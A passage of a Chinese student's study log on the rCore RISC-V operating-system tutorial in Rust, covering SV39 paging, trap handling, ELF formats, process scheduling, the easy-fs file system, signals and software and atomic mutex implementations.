生命周期结束时自动释放物理页。\n\n我们定义了 PageTable 这个结构体作为页表。PageTable 上有一个 `Vec<FrameTracker> `，这样做是为了把物理页的生命周期绑定到页表上。注意这里的物理页是用来存放页表节点的。\n\n我们定义了 MapArea 表示一块连续的虚拟内存空间，其有一个 BTreeMap 来建立虚拟页编号和物理页之间的映射，这样做是为了把物理页的生命周期绑定到这个 MapArea 上。这里的物理页是用来存放数据的。\n\n我们定义了 MemorySet 这个结构体来描述内核/应用程序的内存空间。其有一个 page_table 成员为这个内存空间的一级页表，以此来把页表的生命周期绑定到 MemorySet 上。同时还有一个 Vec 来存放 MapArea，来把 MapArea 的生命周期绑定到 MemorySet 上。\n\n我们可以看到物理页作为一个资源，其生命周期有如下两个绑定路径\n\n- FrameTracker -> PageTable -> MemorySet\n- FrameTracker -> MapArea -> MemorySet\n\n在读这章的时候我一直有疑问，页表已经实实在在存在内存上了，我们为什么还要创建这些结构体。况且这些结构体还附带了 Vec 以及 BTreeMap，这些数据存放在内核的堆栈上。我们相当于把页表又在内核的内存空间中又做了一份。\n\n实际上这么做是为了建立资源之间生命周期的绑定，以借助 Rust 的 RAII 机制帮助我们管理资源\n\n接下来考虑为内核建立内存空间，我们设计的布局如下：\n\n低 256GB ，这个会在内核初始化的时候就被建立\n\n![](https://rcore-os.cn/rCore-Tutorial-Book-v3/_images/kernel-as-low.png)\n\n前面四个段不用多说。最后一个段是物理内存中剩余的空间，这些空间可用来让 FrameAllocator 分配物理页\n\n注意这里建立的内存空间的时候需要是对等映射，即在内核访问的虚拟内存就等同于地址一样的物理内存。这样可以确保内核在启用虚拟内存后仍然能继续正常工作\n\n然后是高 256GB ，这个会在内核加载应用程序时建立\n\n![](https://rcore-os.cn/rCore-Tutorial-Book-v3/_images/kernel-as-high.png)\n\n最高地址处的跳板稍后会说。后面紧跟着的是应用程序的内核栈，栈之间有一个 Guard Page，这个虚拟页并没有映射，为了让栈溢出的时候能够触发异常。\n\n然后考虑建立应用的地址空间。这一章我们就不把编译出来的用户程序的 elf 头去掉了，因为 elf 头中有应用程序各个段的信息，有助于帮助我们建立内存空间\n\n低 256GB，直接根据 elf 的信息建立即可。高 256GB，存放跳板和 Trap 上下文\n\n![](https://rcore-os.cn/rCore-Tutorial-Book-v3/_images/app-as-full.png)\n\n然后我们的应用与内核切换的部分，即 trap 部分也需要修改\n\n当应用发生 trap 时，CPU 跳到 \\_\\_alltraps 处，此时我们还处在应用的地址空间，需要保存 trap 上下文（这也是为什么把 trap 上下文放到应用的虚拟空间中）。不同的是，在 sscratch 中我们存储的是 trap 上下文而不是内核栈（内核栈在内核的内存空间中，也存不了），然后把 sscratch 与 sp 交换，根据交换后的 sp 写入 trap 上下文。由于我们需要知道后续跳入内核之后要跳到哪个地址（trap_handler 在内核中的虚拟地址），kernel 内存空间的 token（用来切换内存空间），内核栈的虚拟地址，所以我们把这三者也用 trap 上下文维护。准备完毕之后先让 sp 指针指向内核栈，然后切换到内核空间，然后使用 jr 指令跳转到 trap_handler\n\n注意，切换内存空间前后 pc 寄存器指向的指令的地址所属的空间就发生了变化，为了让 `__alltraps` 在切换内存空间前后指令仍然能顺利执行下去，我们就需要把 `__alltraps` 和 `__restore` 的代码映射到所有内存空间的同一地方，也就是我们上文所说的位于最高地址处的跳板段。\n\n但这又引发一个问题，如果我们直接调用 call 指令，那么编译器会基于当前代码链接的情况进行相对的跳转。而我们现在是单独把这两个函数抽出来映射到了某个地方，所以不能用 call 指令了，只能手动跳转\n\n同时我们看到，上述 `__alltraps` 和 `__restore` 是针对用户态和内核态之间切换这种具体的情况写的。而对于内核态 trap 到内核态这种情况就不适用了。所以 trap_handler 首先修改 stvec 寄存器，使得内核发生 trap 后 CPU 跳到另一个处理逻辑。trap_handler 在最后执行一个 trap_return ，来把 stvec 寄存器修改回来，同时使用 jr 指令跳到 `__restore`\n\n当我们从页表中准备好地址空间的映射之后，就可以启用虚拟内存了，具体来说\n\nRISCV 64 架构上有一个 `satp` 寄存器来配置虚拟内存，其存放的内容如下：\n\n![](https://rcore-os.cn/rCore-Tutorial-Book-v3/_images/satp.png)\n\n- MODE 控制 CPU 使用哪种页表实现\n\n- PPN 控制当前虚拟地址空间的一级页表存在哪个物理页上\n\n我们写 `satp` 这个寄存器即可\n\n### 启用 SV39 分页机制后虚拟地址和物理地址的结构\n\n![](https://rcore-os.cn/rCore-Tutorial-Book-v3/_images/sv39-va-pa.png)\n\n页表项结构\n\n![](https://rcore-os.cn/rCore-Tutorial-Book-v3/_images/sv39-pte.png)\n\n- V：为 1 时表示页表项是合法的\n- R/W/X：分别控制页表项对应的内存是否允许读/写/执行\n- U：控制页表项对应的内存是否在 U 模式下可被访问\n- G：暂时不用管\n- A：如果页表项被访问了，CPU 就将其置为 1\n- D：如果页表项被修改了，CPU 就将其置为 1\n\n上述除了 G 位不能被操作系统修改，其他都可以\n\n### 页表寻址方式\n\n![](https://rcore-os.cn/rCore-Tutorial-Book-v3/_images/sv39-full.png)\n\nSV39 中采用三级页表。我们将虚拟地址的 27 位虚拟页号分成三个等长的部分，第 26-18 位为一级页索引，第 17-9 位为二级页索引，第 8-0 位为三级页索引\n\nCPU 在进行地址转换时，首先根据 `satp` 寄存器的 `PPN` 字段拿到一级页表的地址。地址再加上一级页索引就得到了对应的页表项。拿到页表项之后 CPU 做如下判断：\n\n- V 值为 0 的话表示没有下一级节点，也就是要转换的虚拟地址是无效的\n- V 值为 1 后\n  - R/W/X 位均为 0 时，表示这是一个中间节点，该表项记录的物理页标号表示的是下一级的页表所在的位置\n  - R/W/X 不全为 0 的话，表示找到头了，该表项记录的物理页标号就是要转换为的物理地址\n\n然后就这么一直往下找\n\n值得注意的是，我们是每 9 位划分为一个索引，也就是每一级页表需要存 512 个页表项，每个页表项 8 字节，所以一个页表是占 4KB 的，正好对应于一个物理页。这也就使得根据物理页标号直接就能找到下一级页表所在位置是可行的\n\n找到目标物理页标号后再加上页内偏移量就得到了具体的地址\n\n我们考虑三级页表中的一个页表项表示 4KB 内存。二级页表中的一个页表项代表一个三级页表，包含了 512 个页表项，那么二级页表的一个页表项表示 2MB 内存。同理一级页表中的一个页表项表示 1GB 内存\n\n假设现在一个程序需要使用大小为 $T$ 的内存，那么内核需要分配 $\\left \\lceil \\frac{T}{1GB} \\right \\rceil $ 个二级页表和 $\\left \\lceil \\frac{T}{2MB} \\right \\rceil $ 个三级页表。而一个页表需要占用 4KB，因此我们的页表额外占了 $4KB \\times (\\left \\lceil \\frac{T}{2MB} \\right \\rceil + \\left \\lceil \\frac{T}{1GB} \\right \\rceil  )$ 内存。如果我们把 $\\left \\lceil \\frac{T}{1GB} \\right \\rceil $ 这一部分忽略，那么可以认为每分配内存给程序 $T$ ，页表额外消耗内存 $\\left \\lceil \\frac{T}{512} \\right \\rceil $\n\n### ELF文件格式\n\n#### ELF 头部\n\n文件头部的前 32 字节，其组成如下：\n\n| 名称        | 字节数 | 说明                                                                                                                                                        |\n| ----------- | ------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| e_ident     | 16     | 一些标志信息                                                                                                                                                |\n| e_type      | 2      | ELF 文件类型                                                                                                                                                |\n| e_machine   | 2      | 指定 ELF 运行的 CPU 架构，具体看 [这里](https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html)                                                   |\n| e_version   | 4      | 指定 ELF 版本，一般为 1                                                                                                                                     |\n| e_entry     | 8      | elf 代码运行的入口，是一个虚拟地址。操作系统应在加载程序后直接执行该虚拟地址处的代码                                                                        |\n| e_phoff     | 8      | Program Header Table 在文件中的偏移量                                                                                                                       |\n| e_shoff     | 8      | Section Header Table 在文件中的偏移量                                                                                                                       |\n| e_flags     | 4      | 处理器特性标签，不太了解                                                                                                                                    |\n| e_ehsize    | 2      | ELF 头的大小，单位为字节                                                                                                                                    |\n| e_phentsize | 2      | Program Header Table 中每个条目的大小                                                                                                                       |\n| e_phnum     | 2      | Program Header Table 中条目的数量                                                                                                                           |\n| e_shentsize | 2      | Section Header Table 中每个条目的大小                                                                                                                       |\n| e_shnum     | 2      | Section Header Table 中条目的数量                                                                                                                           |\n| e_shstrndx  | 2      | 每个 Section 都有一个名称。其中有一个 Section （`.shstrtab`）专门用来存储其他 Section 的名称。该值则表示储存名称的 Section 在 Section Header Table 中的索引 |\n\n其中要展开说的如下：\n\n- e_ident，16字节\n\n| 名称          | 字节数 | 说明                                                         |\n| ------------- | ------ | ------------------------------------------------------------ |\n| ELF 魔数      | 4      | 固定为 `0x7f 0x45 0x4c 0x46` ，表示这是一个合法的 elf 文件   |\n| EI_CLASS      | 1      | 表示文件是 32 位还是 64 位，`0x01` 为 32 位，`0x02` 为 64 位 |\n| EI_DATA       | 1      | 指定大小端，`0x01` 为小端，`0x02` 为大端                     |\n| EI_VERSION    | 1      | ELF 规范版本。目前固定为 `0x01`                              |\n| EI_OSABI      | 1      | 是否启用一些基于操作系统或者 CPU 特性。一般为 `0x00`         |\n| EI_ABIVERSION | 1      | 指定当前 ABI 版本，配合 EI_OSABI 使用。一般也是为 `0x00`     |\n| EI_PAD        | 6      | 预留，一般都为 `0x00`                                        |\n| EI_NIDENT     | 1      | 不太清楚，文档上说的是 e_ident[] 数组大小                    |\n\n![](https://i-blog.csdnimg.cn/blog_migrate/2e4cc110baa4e41b46144c67fea98f64.jpeg)\n\n- e_type，2 字节，表示 ELF 文件类型，常用的如下：\n\n| 名称      | 数值   | 说明             |\n| --------- | ------ | ---------------- |\n| ET_NONE   | 0      | 非文件类型       |\n| ET_REL    | 1      | 可重定位文件     |\n| ET_EXEC   | 2      | 可执行文件       |\n| ET_DYN    | 3      | 共享库           |\n| ET_CORE   | 4      | 内核转储文件     |\n| ET_LOOS   | 0xfe00 | 操作系统特定文件 |\n| ET_HIOS   | 0xfeff | 操作系统特定文件 |\n| ET_LOPROC | 0xff00 | 处理器特定文件   |\n| ET_HIPROC | 0xffff | 处理器特定文件   |\n\n#### Section Header Table\n\n由若干个条目组成。一个条目的结构如下：\n\n| 名称         | 字节数 | 说明                                                                                            |\n| ------------ | ------ | ----------------------------------------------------------------------------------------------- |\n| sh_name      | 4      | Section 的名称。这里存储的是名称在 .shstrtab 中的下表（把 .shstrtab）看成一个字符数组的话       |\n| sh_type      | 4      | Section 的类型                                                                                  |\n| sh_flags     | 8      | Section 的一些配置                                                                              |\n| sh_addr      | 8      | Section 所在的地址。为虚拟地址                                                                  |\n| sh_offset    | 8      | Section 在文件中的偏移量                                                                        |\n| sh_size      | 8      | Section 的大小                                                                                  |\n| sh_link      | 4      | 一般为 0。否则表示这个节和某个节有关联，存储的是相关联的节在 Section Header Table 中的索引      |\n| sh_info      | 4      | Section 的额外信息                                                                              |\n| sh_addralign | 8      | 对齐数值。如果为 0 或者 1 则表示不对齐。启用对其后 sh_addr 必须是 sh_addralign 的倍数           |\n| sh_entsize   | 8      | 如果这个 Section 也是一个 Table （如 `.shstrtab`）的话，那么这个值就表示 Table 里每个条目的大小 |\n\n其中需要具体说明的如下：\n\n- sh_type\n\n常见取值如下\n\n| 名称         | 数值 | 说明                                                                              |\n| ------------ | ---- | --------------------------------------------------------------------------------- |\n| SHT_PROGBITS | 1    | 表示存放代码或者数据，如 `.text` 和 `.data`                                       |\n| SHT_STRTAB   | 3    | 表示存放字符串表，如 `.shstrtab`                                                  |\n| SHT_NOBITS   | 8    | 表示这个 Section 不在 ELF 文件中存放数据，含有的数据都是未初始化的数据。如 `.bss` |\n\n- sh_flags\n\n| 名称                 | 值         | 说明                                  |\n| -------------------- | ---------- | ------------------------------------- |\n| SHF_WRITE            | 0x1        | 表示该节是可写的                      |\n| SHF_ALLOC            | 0x2        | 表示该节需要分配内存                  |\n| SHF_EXECINSTR        | 0x4        | 表示该节可执行                        |\n| SHF_MERGE            | 0x10       | 表示该节可以被合并                    |\n| SHF_STRINGS          | 0x20       | 表示该节包含字符串                    |\n| SHF_INTO_LINK        | 0x40       | 表示 `sh_info` 字段包含额外的语义信息 |\n| SHF_LINK_ORDER       | 0x80       | 表示该节的链接顺序依赖于另一个节      |\n| SHF_OS_NONCONFORMING | 0x100      | 表示该节需要操作系统特殊处理          |\n| SHF_GROUP            | 0x200      | 表示该节属于一个节组                  |\n| SHF_TLS              | 0x400      | 表示该节包含线程本地存储              |\n| SHF_MASKOS           | 0x0ff00000 | 保留给操作系统特定的语义              |\n| SHF_MASKPROC         | 0xf0000000 | 保留给处理器架构特定的语义            |\n\n以上的值进行按位或即可得到 sh_flags\n\n## 04-16~04-17（进程）\n\n完成了第五章，这一章相对简单，主要集中在软件的部分，没有涉及到硬件的地方\n\n这一章引入了进程这个概念。我个人理解进程大概就是可以让一个可执行文件在系统上同时运行多个副本。\n\n关于进程有如下的几个操作\n\n- `fork` 把当前的进程复制一份，并把复制出来的进程作为当前进程的子进程。复制前后的进程是完全一致的，甚至从相同的地方开始执行相同的代码。fork 之后父子进程就都相当于从 fork 函数中返回了，但拿到的返回值是不同的，以区分父子进程\n- `exec` 将当前进程的内存空间清空，加载某个程序到当前进程，并从头开始执行\n- `waitpid` 判断指定的子进程是否结束，如果结束了就拿到其返回值\n\n系统在初始化完毕后会加载第一个进程 iniproc。然后 iniproc 加载 shell 进程，shell 进程等待用户的操作，来执行其他进程。加载一个进程时先 fork，把当前进程复制一份，然后再 exec，加载指定程序。因此可以认为所有进程都是 initproc 派生出来的\n\n当一个进程结束时，其虚拟空间会被释放，但是其他的资源（如内核栈，还有页表占用的内存（这个还不回收是因为其生命周期是绑定到 MemorySet 的，MemorySet 后续随 TaskControlBlock 释放））不会被释放。因为程序退出的时候实际上是进行了系统调用，而系统调用执行的过程中正用着内核栈了，直接把内核栈释放掉会出问题。此外返回值信息也记录在 TCB 中，需要被父进程获取，也不能释放。我们把已经退出但还有部分资源没被释放的进程的状态标为 Zombie\n\n如果进程结束时其还存在没有结束的子进程，那么这些子进程会被挂在 initproc 下，作为 initproc 的子进程\n\n父进程可以通过不断地调用 waitpid 来等待子进程结束并取返回值。如果目标进程状态为 Zombie，那么说明已经结束，可以取到返回值给父进程，并将子进程剩余的资源全部释放\n\n### 进程调度\n\n评价维度：\n\n1. 周转时间：结束时间 - 到达时间\n2. 响应时间：任务被第一次处理的时间 - 任务到达的时间\n\n#### 批处理系统调度\n\n我们假设任务在执行过程中不会被抢占，且任务的耗费时间是确定的\n\n##### FIFO/FCFS（先来先服务）策略\n\n即从头开始依次执行进程\n\n如果每个任务耗费的时间是相同的，那么是最优方案。\n\n存在的问题是，如果每个任务耗费时间不同，可能一个耗时比较短的进程的前面有一个耗时很长的进程，这样的话就会拖累平均周转时间\n\n##### SJF （最短作业优先）策略\n\n即先根据任务需要耗费的时间进行排序，然后再走 FIFO 策略\n\n在任务同时到达的情况下是最优的方案\n\n存在的问题是：需要任务同时到达，这样才可以比较任务耗费的时间来确定优先级。如果不是同时到达的话策略不一定最优\n\n### 交互式系统调度\n\n这次，任务可能会被抢占。但任务耗费时间仍然是可计算的\n\n##### STCF（最短完成时间优先）策略\n\n在 SJF 策略之上，我们让任务可以抢占。即如果后面又来了个耗费时间更短的任务，那么就先执行这个任务\n\n存在的问题是：如果两个耗费相同的时间的任务同时到达，尽管前三个策略的平均周转时间一样，但是平均响应时间都很慢，交互性很差\n\n##### RB（轮转）策略\n\n我们引入时间片，就跟之前我们做的一样\n\n注意时间片不能设置的太小，不然任务调度所花费的时间占比太高\n\n存在的问题是：虽然平均响应时间很快，但是平均周转时间就不太优了\n\n#### 通用计算机系统调度\n\n##### MLFQ （多级反馈队列）策略\n\n我们建立多个队列，每个队列都有一个优先级（队列的数量是经验值，如 Linux 系统设置 140 个队列）\n\n我们考虑把 I/O 密集型的任务放到高优先级，把 CPU 密集型任务放到低优先级。然后在调度的时候，从最高优先级开始，按轮转调度策略进行调度，直到该优先级所有的任务都处于堵塞状态（等待 I/O 响应）\n\n由于我们不可能提前知道一个任务是 I/O 密集型还是 CPU 密集型，那么就需要动态调整。首先假设新创建的任务是 I/O 密集型的，设为最高优先级，然后设置一个时间配额（一般是时间片的整数倍，经验值），如果该任务在时间配额内睡眠、等待 IO 而主动放弃处理器，那么其大概率还是 IO 密集型任务，保持其优先级。否则，其大概率是 CPU 密集型任务，降低其优先级\n\n但还存在问题，优先级只能降低，会出问题。而且计算机系统中有大量交互进程，每个进程执行时间短，一致占用着最高优先级，这导致低优先级的进程一直无法执行，出现饥饿现象\n\n解决方案是统计一个进程在就绪态的等待时间和在堵塞态的等待时间。然后让等待时间和优先级成反比关系。并且让就绪等待时间的优先级提升度的程度比堵塞等待时间的优先级提升度小，从而仍使得 IO 密集型任务仍由于 CPU 密集型任务\n\n##### 比例份额调度策略——彩票调度策略\n\n首先按进程的优先级，分发相应数量的彩票。然后每次调度时内核生成一个随机数，作为中奖号码，然后看哪个进程中奖了，就让哪个进程执行\n\n例如，计算机系统中有两个进程PA和PB，优先级分别为2和8，这样它们分别拥有2张（编号为0-1）和8张彩票（编号为2-9），按照彩票调度策略，操作系统会分配PA大约20%的处理器时间，而PB会分配到大约80%的处理器时间。\n\n优点是能解决饥饿问题，即使优先级小，但经过长时间也有机会获得执行的机会。而且调度策略的开销比较小\n\n缺点是，优先级不好确定，公平性不好保证。而且短时间内会有不确定性，必须经过很长的时间之后才能让进程之间被执行的时间比例近似于优先级比例\n\n##### 比例份额调度策略——步长调度\n\n例如，计算机系统中有两个进程PA和PB几乎同时到达，优先级分别为2和8，用一个预设的大整数（如1000）去除以优先级，就可获得对应的步长，这样它们的步长分别是500和125在具体执行时，先选择PA执行，它在执行了一个时间片后，其行程为500；在接下来的4个时间片，将选择执行行程少的PB执行，它在连续执行执行4个时间片后，其形成也达到了500；并这样周而复始地执行下去，直到进程执行结束。，按照步长调度调度策略，操作系统会分配PA大约20%的处理器时间，而PB会分配到大约80%的处理器时间\n\n优点是解决了彩票调度的不确定性\n\n缺点是每个新来的进程在开始一段时间都会一直占用着 CPU，有点不公平了。而且优先级仍然不好确定\n\n#### 实时计算机系统调度\n\n实时操作系统的每个任务都有一个截止时间。系统必须在截止时间之前把任务完成。\n\n我们假设任务的执行时间是可以估计的\n\n在实时操作系统中，周转时间和响应时间都不重要，能在截止时间之前完成任务才是最重要的。\n\n我们考虑周期性任务：任务每隔一段时间就要执行一次，且需要在下一个周期来临之前执行完毕\n\n设任务 $i$ 的周期为 $P_i$，需要 $C_i$ 的时间处理这个任务。那么计算机系统能够实时调度这些任务的条件是\n\n$$\n\\sum \\frac{C_i}{P_i} \\le 1\n$$\n\n##### RMS（速率单调调度）策略\n\n执行周期越短的进程优先级越高\n\n前提是要执行的进程信息在最开始时就被确定，并在后续不接收新的进程，也不调整优先级或者进行 CPU 抢占。在静态实时调度算法中，RMS 是最优的\n\n##### EDF（最早截止时间优先）策略\n\n每次调度时，对所有任务的截止时间进行排序，选择截止时间最近的任务进行执行\n\nEDF 策略是动态的实时调度算法\n\n## 04-23~04-25（文件系统）\n\n由于准备期中考试，进度严重停滞。考完之后赶紧来继续完成了第六章\n\n这章制作了一个叫做 easy-fs 的文件系统，感觉比较困难的地方是整个的层次架构，在这里梳理一下。\n\n整个文件系统的结构如图所示\n\n![](https://rcore-os.cn/rCore-Tutorial-Book-v3/_images/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B8%83%E5%B1%80.png)\n\n文件系统把磁盘看成一块一块的，并根据块的编号来进行操作。第一个块是超级块，记录了文件系统的特征魔数，索引节点位图的大小（块数量），索引节点区域的大小，数据块位图的大小，数据块区域的大小\n\n创建文件系统的时候，索引节点位图大小需要手动设置，然后索引节点区域大小就能计算出来。剩余区域根据神秘的数学公式也能计算出数据块位图和数据块区域的大小\n\neasy-fs 作为一个 crate 被独立出来。在最底层有一个 BlockDevice 的接口，用于接入内核。BlockDevice 主要需要两个功能：读块和写块\n\n再往上，有一个 BlockCacheManager，相当于一层缓存。注意的是，这个缓存层可以管理多个设备：其内部有一个队列，队列中维护当前被缓存的块，即 BlockCache ，而 BlockCache 内还包含了块设备对象的指针\n\n再往上，是 EasyFileSystem，这一层表示文件系统，包含文件系统信息和块设备对象指针，提供了打开/创建文件系统、获取根目录的索引节点（root_inode），分配/释放索引节点，分配/释放数据节点等功能。其操作具体的块的时候都是调用 BlockCacheManager 来进行操作\n\n再往上，是 Inode ，表示索引节点。这个 Inode 是存储在堆栈上的而不是存储在磁盘上的。其包含了索引节点所在的块的编号和块内偏移量，以及文件系统对象指针，块设备对象指针（EasyFileSystem 和 Inode 包含块设备对象指针是因为他们调用 BlockCacheManager 的时候需要提供块设备对象指针，感觉这里封装的不好）\n\n由于索引节点的最终目的是要指向数据块，所以 DiskInode 存储了该索引节点表示的文件的数据所在的数据块的编号（可以理解为索引节点是一个胖指针）。为了充分利用空间，索引节点做如下设计：\n\n在索引数据时，首先是若干个直接索引，直接索引直接存储数据块的块编号\n\n直接索引不够用的话上一级间接索引，一级间接索引指向了一个数据块，但这个数据块并非存储文件数据，而是继续存储若干个数据块的编号，这些数据块中就存储文件数据了\n\n一级间接索引不够用就上二级间接索引，其指向了一个数据块，这个数据块存储若干个数据块的编号，不过这一次每个编号指向的数据块存储的是一个一级间接索引表结构\n\n整个索引结构有点类似虚拟内存的多级页表\n\nInode 提供了读写 DiskInode （即索引节点在磁盘上的数据），读写索引节点指向的数据块，清空索引节点指向的数据块，扩缩容索引节点的数据块总量等接口\n\n再往上，操作系统将 Inode 封装成 OSInode\n\n## 04-25~04-29（进程通信）\n\n完成第七章\n\n感觉这章难度不大了\n\n这章首先给标准输入输出实现了 File trait，将其视为了一个文件，非常简单\n\n然后是管道，管道建立在内核的堆中，并将生命周期绑定在 TCB 的文件描述符表上。管道具体的结构是一个循环队列。当队列满的时候写队列，或者队列为空的时候读队列，都会堵塞进程\n\n然后是传递命令行参数，内核在启动进程前会先把参数信息写入内核栈，具体的结构是这样\n\n![](https://rcore-os.cn/rCore-Tutorial-Book-v3/_images/user-stack-cmdargs.png)\n\n然后把 argv_base 和参数个数存到寄存器里作为调用 main 函数的参数\n\nIO 重定向这里感觉很妙，我们引入 `sys_dup` 这个系统调用，作用是复制一个文件描述符。具体操作时，我们先 fork，然后在子进程里判断是否要重定向 IO。如果要重定向 stdin，那么就先打开一个文件，获得文件描述符 fd，然后把 stdin 的文件描述符释放掉，再把 fd 复制一份。由于我们分配文件描述符的时候一定是分配最小编号，所以把 stdin 释放相当于腾出了个位置，后续 fd 复制出来的文件描述符编号必然是 stdin 的。这样就很巧妙地实现了 IO 重定向\n\n信号这里首先涉及到了若干系统调用\n\n- `sys_kill` 向指定进程发送信号\n- `sys_sigaction` 设置信号处理的 handler。一些信号不能设置自定义的 handler，这些信号只能由内核处理\n- `sys_procmask` 设置当前进程的信号屏蔽掩码，即设置当前进程要屏蔽哪些信号\n- `sys_sigreturn` 从信号处理 handler 返回要执行这个\n\n信号来源\n\n- 使用 kill 来给自身进程或是其他进程发送信号\n- 内核检测到了某些事件来给进程发信号，如子进程状态改变，内核就会给父进程发信号\n- 进程在执行的时候触发了某些异常，trap 到了内核\n\n发送信号的过程其实就是内核在目标进程的 TCB 上打了个标记\n\n当进程从内核态准备返回用户态之前（如进程被调度回来、系统调用返回、trap后返回），内核会检查这个进程是否标记有信号，如果有，那么进入信号处理阶段\n\n对于一些信号，如 SIGKILL/SIGSTOP/SIGCONT/SIGDEF，由内核亲自处理。对于其他信号，内核会首先在进程的 TCB 上查找这个信号是否有对应的 handler，如果有，那么就准备跳入这个 handler\n\n跳入之前内核会备份当前的 trap 上下文，然后修改当前上下文（修改跳入内核态之后开始执行的地址，以及保存参数的寄存器），后续直接跳入用户态就可以了\n\n在信号处理阶段结束，跳入到内核态之前，还有一层判断，即是判断当前进程是否包含某些信号，如 SIGINT/SIGILL... 这些，这些信号标志着当前进程出现了错误，需要立刻被内核杀死\n\n当 sigreturn 调用时，内核会把之前备份的 trap 上下文恢复，再次跳入到用户态后，就跟什么都没发生过一样，继续正常执行\n\n### 一些信号的含义\n\n- SIGABRT 非正常的进程退出，可能由调用 abort 函数产生（产生后进程将被内核杀死）\n- SIGCHLD 子进程状态变更（通常是子进程结束）时产生\n- SIGINT 按下 Ctrl+C 组合键产生（感觉像是用户产生的结束进程信号）（产生后进程将被内核杀死）\n- SIGKILL 由内核或是其他进程产生的信号（感觉像是内核或者其他进程产生的结束进程信号）（不能自行处理，由内核处理）（产生后进程将被内核杀死）\n- SIGSEGV 非法内存访问异常，由内核发送给触发异常的进程（产生后进程将被内核杀死）\n- SIGILL 非法指令异常，由内核发送给触发异常的进程（产生后进程将被内核杀死）\n- SIGTSTP 按下 Ctrl+Z 组合键产生，表示暂停进程，这个信号能被进程自行处理决定是否暂停以及如何暂停\n- SIGSTOP 也表示暂停进程，但是这个是由内核强制暂停（不能自行处理，由内核处理）\n- SIGCONT 恢复暂停的进程（不能自行处理，由内核处理）\n- SIGUSR1/2 用户自定义信号\n\n### 可能出现的锅\n\n这章信号一节感觉锅不少，这里列几个作为备忘。作为一个量级不小的项目，确实很难考虑的非常完善\n\n- sigreturn 的系统调用没有检查 handling_sig 是否已经为 -1，不然用户程序在非信号处理函数中调用这个系统调用会直接使内核 panic\n- 如果信号处理函数没有调用 sigreturn 而是正常返回了呢？似乎这种情况下，用户栈会直接弹到触发信号之前的情形（毕竟我们在调用信号处理函数的时候保留了用户栈），但是调用者保存寄存器没有保存，感觉还是会出问题\n- 如果信号处理函数执行到一般又有信号触发了，且没有被 mask （即嵌套 trap），那么目前的代码还是会跑一边信号处理流程，又把当前的 trap 上下文备份起来，但之前已经有了一个备份了，最开始的 trap 上下文会丢失\n- fork 后，signal_actions 和 signal_mask 会从父进程继承，signal_mask 继承感觉问题不大，但是 signal_action 继承后，后续如果执行 exec，信号处理函数的地址就无效了\n\n## 04-29~05-02（并发）\n\n完成了第八章\n\n这一章首先使我们的内核支持多线程，将内核任务执行的架构进行了大规模的重构。任务调度的单位从进程变成了线程。一个进程包含若干个线程。进程之间是隔离的，而与进程不同的是，线程是追求共享的。线程之间共享进程的资源。线程支持的具体实现就是把线程需要共享的东西提到 PCB 中，TCB 从描述一个进程变为描述一个线程，而内核在调度的时候还是对于 TCB 进行调度的。每个线程都需要有自己的内核栈，用户栈，trap 上下文，task 上下文。\n\n有了线程之后就会出现一些线程问题，涉及到锁、信号量、条件变量\n\n### 互斥\n\n- 单标记尝试\n\n```rust\nstatic mut OCCUPIED: bool = false;\n\nunsafe fn lock() {\n    while vload!(OCCUPIED) {}\n    OCCUPIED = true;\n}\n\nunsafe fn unlock() {\n    OCCUPIED = false;\n}\n```\n\n其中不断循环判断锁是否释放是一种**忙等待**，也被称为**自旋**。对于单核 CPU，在时间片用完切换到下一线程之前，OCCUPIED 是不会发生改变的，因此 CPU 资源造成了浪费。rust 中提供了 `spin_loop_hint` 函数，在循环体内调用该函数可以通知 CPU 当前线程处于忙等待状态，CPU 可能会进行一些优化（如降频，减少功率）\n\n同时对 OCCUPIED 的赋值操作也并非原子操作，该方案是错误的\n\n- Peterson 算法\n\n```rust\n// user/src/bin/adder_peterson_spin.rs\n\n/// FLAG[i]=true 表示线程 i 想要进入或已经进入临界区\nstatic mut FLAG: [bool; 2] = [false; 2];\n/// TURN=i 表示轮到线程 i 进入临界区\nstatic mut TURN: usize = 0;\n\n/// id 表示当前的线程 ID ，为 0 或 1\nunsafe fn lock(id: usize) {\n    FLAG[id] = true;\n    let j = 1 - id;\n    TURN = j;\n    compiler_fence(Ordering::SeqCst);\n    while vload!(FLAG[j]) && vload!(TURN) == j {}\n    // 上述代码等价于 while FLAG[j] && TURN == j {}\n}\n\nunsafe fn unlock(id: usize) {\n    FLAG[id] = false;\n}\n```\n\n上述代码可以保证在无硬件支持情况下，全靠软件实现互斥的功能。我们根据锁的评价指标来分析一下：\n\n（1）空闲则入：只有单线程要进入临界区，那么一定能够进去。上述代码中，如果只有一个线程要获取锁，那么 `flag[j]` 为 `false` ，忙等待循环结束，线程进入临界区\n\n（2）互斥访问：\n\n首先考虑两个 lock 操作不重叠。假设 $T_j$ 已经进入临界区，那么此时 `flag[j]=true`，`turn=j`。现在 $T_i$ 尝试拿锁，他将 `flag[i]` 置为 `true`，并将 `turn` 设为 `j`，我们发现此时循环条件满足，$T_i$ 进入忙等待，直到 $T_j$ 把锁还回去，即设置 `flag[j]` 为 `false`\n\n再考虑两个 lock 操作重叠的情况。简单起见我们假设 `flag` 都是原子操作，不会产生影响。两个线程开始都把 `flag` 设为 `true` ，于是忙等待条件就变成了线程 $T_i$ 只要有 `turn` 为 `j` 就忙等待，$T_j$ 同理。我们发现，一个线程仅靠自己是无法让 `turn` 为自身的，必须有另一个线程的帮忙。而另一个线程帮忙设置完 turn 之后自己仍是忙等待。而对于 `turn` 的修改，无论是否原子，总会有一个靠后的修改操作。哪个线程最后修改了 `turn`，那么另一个线程就能进入临界区域\n\n（3）有界等待\n\n$T_i$ 让出锁之后，此时 `turn` 仍为 `j`。此时 $T_i$ 仍尝试拿锁，`turn` 仍为 `j`，而退出忙等待的条件为 `turn=i`。而只有 $T_j$ 能做到将 `turn` 置为 `i`，因此后续必然是 $T_i$ 拿不到锁 $T_j$ 也别想拿到锁\n\n综上 Peterson 算法是一个合格的锁实现。但是这种算法只能运行在单核 CPU 上\n\n- 关中断\n\n可以考虑拿锁之后就把时钟中断关闭，把锁放回去之后就启动时钟中断\n\n这种做法无法适应多处理器架构\n\n- 使用原子指令的单标记\n\n```rust\n// user/src/bin/adder_atomic.rs\n\nstatic OCCUPIED: AtomicBool = AtomicBool::new(false);\n\nfn lock() {\n    while OCCUPIED\n    .compare_exchange(false, true, Ordering::Relaxed, Ordering::Relaxed)\n    .is_err()\n    {\n        yield_();\n    }\n}\n\nfn unlock() 